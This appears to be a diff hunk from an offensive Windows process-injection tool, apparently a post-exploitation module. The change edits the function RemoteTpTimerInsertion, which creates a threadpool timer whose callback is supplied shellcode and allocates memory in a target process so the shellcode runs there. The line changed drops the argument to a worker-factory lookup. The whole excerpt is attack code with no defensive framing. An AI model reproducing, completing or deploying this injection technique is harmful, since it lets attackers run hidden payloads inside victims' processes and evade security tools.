@@ -4,7 +4,7 @@ void RemoteTpTimerInsertion(HANDLE hTarget, LPVOID pShellcodeAddress) {
     _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
     _NtSetTimer2 NtSetTimer2 = (_NtSetTimer2)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetTimer2"));
 
-    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation(hTpWorkerFactory);
+    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation();
     PFULL_TP_TIMER pTpTimer = (PFULL_TP_TIMER)KERNEL32$CreateThreadpoolTimer((PTP_TIMER_CALLBACK)(pShellcodeAddress), NULL, NULL);
     PFULL_TP_TIMER RemoteTpTimerAddress = (PFULL_TP_TIMER)(KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
